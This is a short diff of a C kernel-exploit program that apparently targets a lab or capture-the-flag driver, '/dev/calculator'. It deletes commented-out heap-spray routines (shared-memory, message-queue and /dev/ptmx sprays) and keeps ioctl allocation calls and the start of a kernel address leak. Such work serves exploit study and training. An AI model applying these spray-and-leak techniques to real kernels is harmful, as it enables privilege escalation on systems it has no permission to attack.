@@ -29,21 +29,6 @@ void slabinfo() {
   hold();
 }
 
-// void spray_shm(int count, size_t size) {
-//   for (int i = 0; i < count; i++) {
-//     int shmid = shmget(IPC_PRIVATE, size, IPC_CREAT | 0666);
-//     if (shmid == -1) {
-//       perror("shmget");
-//     }
-//
-//     // Присоединяем для увеличения счётчика ссылок
-//     void *addr = shmat(shmid, NULL, 0);
-//     if (addr == (void *)-1) {
-//       perror("shmat");
-//     }
-//   }
-// }
-
 void main() {
   int fd = open("/dev/calculator", O_RDWR);
 
@@ -52,27 +37,6 @@ void main() {
   ioctl(fd, ALLOC_CMD, 0);
   // slabinfo();
   // ioctl(fd, FREE_CMD, 0);
-
-  // slabinfo();
-
-  // int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-  // struct msgbuf *msg = malloc(sizeof(*msg));
-  // msg->mtype = 1;
-  // memset(&msg->mtext, 'A', SPRAY_SIZE);
-
-  // puts("Spraying heap...");
-  // for (int i = 0; i < 300; i++) {
-  // msgsnd(qid, msg, SPRAY_SIZE, 0);
-  // }
-
-  // slabinfo();
-  // spray_shm(300, 90);
-  // for (int i = 0; i < 300; i++) {
-  //   int fd2 = open("/dev/ptmx", O_RDWR | O_NOCTTY);
-  //   printf("fd opened %d\n", fd2);
-  // }
-
-  // slabinfo();
 
   puts("Leak kernel addr...");
   int64_t history_res;
